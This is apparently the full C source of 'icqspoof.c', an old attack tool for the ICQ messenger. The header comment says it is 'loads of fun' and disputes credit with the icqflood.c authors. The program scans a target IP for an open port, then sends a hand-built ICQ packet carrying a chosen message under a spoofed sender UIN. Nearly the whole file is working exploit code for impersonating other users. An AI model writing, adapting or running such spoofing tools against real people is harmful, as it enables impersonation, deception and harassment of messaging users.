/* icqspoof.c -  This program sends a message to a given ICQ user and it
* will appear to be from an arbitrary UIN. Loads of fun.
*
*  Notes:
*  As many of you know icqflood.c has been distributed by enkil^ and irQ.
*  They claim their program is all their own work.  Yet the "header" they
* use contains MY UIN.  Strange, eh?
* A simple, "Packet Dump that we based our exploit on provided by Seth
* McGann" would have been enough.  Even though I didn't specifically
* request credit it might have been nice to say something.  In the future
* when you expand on someone's idea and work (yeah those traces didn't fall
* out of the sky ya know) give credit where credit is due.
*
* Concept, Protocol Analysis and Coding: Seth McGann
* Some functions dealing with socket scanning: icqflood.c by enkil^ and irQ
* With help from my roomate (target practice)
* And yes, this still works with ICQ 98. Coming soon: Chat and File Spoofing
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>

int main(argc, argv)
int argc;
char *argv[];
{
  struct sockaddr_in sin;
        int sock,i,x,y;
        unsigned long uin;
        int Port;

  char buffer[16];
  int connected = 1;
  typedef struct icq_prot {
  unsigned char magicNum[2];
  unsigned char UIN[4];
  unsigned char unknown[4];
  unsigned char unknown2[2];
  unsigned char length[2];
  unsigned char strng[256];
  } icq_prot;
  icq_prot sendMessage;
  unsigned long temp;
  unsigned char bigguy[1024];
  if (argc != 6) {
    fprintf(stderr,"Usage:  icqspoof ip SpoofedUIN message startport endport\n");

    exit(1);
  }
  Port = ScanPort(argv[1],atoi(argv[4]),atoi(argv[5]));
  if (Port == -1) {
                printf("No ICQ Port Found =(\n");
                return;
  }

  sendMessage.magicNum[0]=0x2e;
  sendMessage.magicNum[1]=0x0;
  sendMessage.unknown[0]=0x04;
  sendMessage.unknown[1]=0x01;
  sendMessage.unknown[2]=0x0F;
  sendMessage.unknown[3]=0x0;
  sendMessage.unknown2[0]=0x01;
  sendMessage.unknown2[1]=0x0;
  temp=atol(argv[2]);
  sendMessage.UIN[0]=temp & 0xFF;
  sendMessage.UIN[1]=(temp >> 8) & 0xFF;
  sendMessage.UIN[2]=(temp >> 16) & 0xFF;
  sendMessage.UIN[3]=0;
  strncpy(sendMessage.strng,argv[3],256);
  sendMessage.length[0]=strlen(sendMessage.strng)+1;
  sendMessage.length[1]=0;

  if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
                        printf("Error: Unable to creat socket, Exiting.\n");
                        exit(1);
                }
  sin.sin_family = AF_INET;
                sin.sin_addr.s_addr = inet_addr(argv[1]);
                sin.sin_port = htons(Port);

   if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))==-1) {
                        printf("Error Connecting to Socket\n");
                        return;
   }



  x=20;
   bigguy[0]=(41+strlen(sendMessage.strng)+1) & 0xFF;
   bigguy[1]=((41+strlen(sendMessage.strng)+1) >> 8) & 0xFF;
 
  bigguy[2]=sendMessage.UIN[0];
  bigguy[3]=sendMessage.UIN[1];
  bigguy[4]=sendMessage.UIN[2];
  bigguy[5]=sendMessage.UIN[3];
  bigguy[6]=0x02;
  bigguy[7]=0x00;
  bigguy[8]=0xEE;
  bigguy[9]=0x07;
  bigguy[10]=0x00;
  bigguy[11]=0x00;
  bigguy[12]=sendMessage.UIN[0];
  bigguy[13]=sendMessage.UIN[1];
  bigguy[14]=sendMessage.UIN[2];
  bigguy[15]=sendMessage.UIN[3];
  bigguy[16]=0x01;
  bigguy[17]=0x00;
  bigguy[18]=sendMessage.length[0];
  bigguy[19]=sendMessage.length[1];
  for(i=0;i<sendMessage.length[0];i++)
  bigguy[x++]=sendMessage.strng[i];
  bigguy[x++]=0x82;
  bigguy[x++]=0xD7;
  bigguy[x++]=0xF3;
  bigguy[x++]=0x20;
  bigguy[x++]=0x82;
  bigguy[x++]=0xD7;
  bigguy[x++]=0xF3;
  bigguy[x++]=0x20;
  bigguy[x++]=0x09;
  bigguy[x++]=0x04;
  bigguy[x++]=0x00;
  bigguy[x++]=0x00;
  bigguy[x++]=0x04;
  bigguy[x++]=0x00;
  bigguy[x++]=0x00;
  bigguy[x++]=0x10;
  bigguy[x++]=0x01;
  bigguy[x++]=0xEB;
  bigguy[x++]=0xFF;
  bigguy[x++]=0xFF;
  bigguy[x++]=0xFF;
  bigguy[x++]=0x02;
  bigguy[x++]=0x00;
  bigguy[x++]=0x0A;
  bigguy[x++]=0x09;
  bigguy[x++]=0x00;   
  write(sock,bigguy,x-1);
  printf("Done!\n");
  close(sock);
  return 0;
}

int ScanPort(char *ipaddr, int StartIP, int EndIP) {
        struct sockaddr_in sin;
        int sock,x,y;
        unsigned long uin;
        printf("Scanning Ports");
        for (x=StartIP;x<=EndIP;++x) {
                if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
                        printf("Error: Unable to connect\n");
                        return -1;
                }
                sin.sin_family = AF_INET;
                sin.sin_addr.s_addr = inet_addr(ipaddr);
                sin.sin_port = htons(x);

                if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))!=-1) {
                        close(sock);
                        printf("Port %d Open! Spoofing...\n",x);
                        fflush(stdout);
                        return x;
                }
                printf(".");
                fflush(stdout);
        }
        printf("\n");
        return -1;
}